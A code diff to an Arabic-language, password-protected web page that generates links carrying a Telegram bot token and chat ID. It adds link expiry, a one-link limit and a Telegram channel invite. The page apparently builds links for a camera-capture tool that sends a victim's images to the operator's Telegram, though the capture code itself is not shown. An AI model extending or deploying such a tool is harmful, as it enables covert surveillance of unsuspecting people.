@@ -90,6 +90,22 @@
             color: #FFD700;
             text-decoration: none;
         }
+
+        .telegram {
+            margin-top: 20px;
+        }
+
+        .telegram img {
+            width: 24px;
+            height: 24px;
+            vertical-align: middle;
+        }
+
+        .expiry {
+            margin-top: 10px;
+            font-size: 1em;
+            color: #FFD700;
+        }
     </style>
 </head>
 <body>
@@ -112,12 +128,22 @@
                 <button type="submit">إنشاء الرابط</button>
             </form>
             <div id="result" class="result hidden"></div>
+            <div id="expiry-time" class="expiry hidden"></div>
         </div>
     </div>
-    <footer>© 2024 - إعداد تطبيق الكاميرا</footer>
+    <footer>
+        <div class="telegram">
+            <a href="https://t.me/+4WnxlFYJlE80ZTEy" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+                انضم إلى قناتي
+            </a>
+        </div>
+        © 2024 - إعداد تطبيق الكاميرا
+    </footer>
 
     <script>
         const PASSWORD = "Q7CamEra7";
+        const LINK_EXPIRY_HOURS = 24;
 
         function checkPassword() {
             const passwordInput = document.getElementById("password");
@@ -125,8 +151,26 @@
             if (passwordInput.value === PASSWORD) {
                 document.getElementById("password-container").classList.add("hidden");
                 document.getElementById("form-container").classList.remove("hidden");
+                checkExistingLink();
             } else {
                 errorMessage.classList.remove("hidden");
+            }
+        }
+
+        function checkExistingLink() {
+            const savedLink = localStorage.getItem("generatedLink");
+            const savedTime = localStorage.getItem("generatedTime");
+            const now = new Date().getTime();
+
+            if (savedLink && savedTime) {
+                const elapsedTime = (now - parseInt(savedTime)) / (1000 * 60 * 60); // تحويل إلى ساعات
+                if (elapsedTime < LINK_EXPIRY_HOURS) {
+                    showLink(savedLink);
+                    showExpiryTime(savedTime);
+                } else {
+                    localStorage.removeItem("generatedLink");
+                    localStorage.removeItem("generatedTime");
+                }
             }
         }
 
@@ -135,14 +179,34 @@
             const token = document.getElementById("token").value;
             const chatId = document.getElementById("chat-id").value;
 
-            // إنشاء الرابط بدون تشفير
+            const existingLink = localStorage.getItem("generatedLink");
+            if (existingLink) {
+                alert("لا يمكنك إنشاء رابط جديد حتى انتهاء صلاحية الرابط الحالي.");
+                return;
+            }
+
             const baseUrl = "main.html";
             const link = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
 
-            // عرض الرابط للمستخدم
+            localStorage.setItem("generatedLink", link);
+            localStorage.setItem("generatedTime", new Date().getTime());
+
+            showLink(link);
+            showExpiryTime(new Date().getTime());
+        }
+
+        function showLink(link) {
             const result = document.getElementById("result");
             result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
             result.classList.remove("hidden");
+        }
+
+        function showExpiryTime(createdTime) {
+            const expiryTimeElement = document.getElementById("expiry-time");
+            const expiryTime = new Date(parseInt(createdTime) + LINK_EXPIRY_HOURS * 60 * 60 * 1000);
+            const expiryDateString = expiryTime.toLocaleString();
+            expiryTimeElement.textContent = `ينتهي الرابط في: ${expiryDateString}`;
+            expiryTimeElement.classList.remove("hidden");
         }
     </script>
 </body>
